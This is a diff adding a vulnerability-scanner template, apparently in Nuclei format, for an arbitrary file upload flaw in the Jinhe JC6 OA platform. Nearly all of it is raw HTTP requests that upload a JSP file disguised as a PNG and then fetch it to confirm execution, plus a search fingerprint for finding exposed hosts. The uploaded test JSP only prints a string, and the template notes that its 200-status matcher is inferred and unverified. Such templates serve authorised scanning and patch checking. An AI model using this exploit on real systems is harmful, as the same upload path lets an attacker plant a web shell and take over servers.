@@ -1,0 +1,74 @@
+id: poc-11a46be0032bebd4ab59
+info:
+  name: 金和OAJC6saveAsOtherFormatServlet任意文件上传漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/11a46be0032bebd4ab59aea6193b3d6a
+
+    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: file-upload,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: 11a46be0032bebd4ab59aea6193b3d6a
+    fofa: + hunter`web.body="JC6金和协同管理平台"`
+http:
+- raw:
+  - 'POST /jc6/servlet/saveAsOtherFormatServlet?fileName=stc.jsp HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)
+
+    Accept-Encoding: gzip, deflate
+
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+
+    Connection: close
+
+    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+
+    Upgrade-Insecure-Requests: 1
+
+    Content-Length: 207
+
+    Content-Type: multipart/form-data; boundary=74f0dc3df975274386a11be68cacc0e5
+
+
+    --74f0dc3df975274386a11be68cacc0e5
+
+    Content-Disposition: form-data; name="FileBlod"; filename="stc.jsp"
+
+    Content-Type: image/png
+
+
+    <% out.println("tteesstt2");%>
+
+    --74f0dc3df975274386a11be68cacc0e5--'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
+- raw:
+  - 'GET /jc6/upload/gwzw/stc.jsp HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Upgrade-Insecure-Requests: 1
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
+
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+
+    Accept-Encoding: gzip, deflate
+
+    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+
+    Connection: close
+
+    Content-Length: 0'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
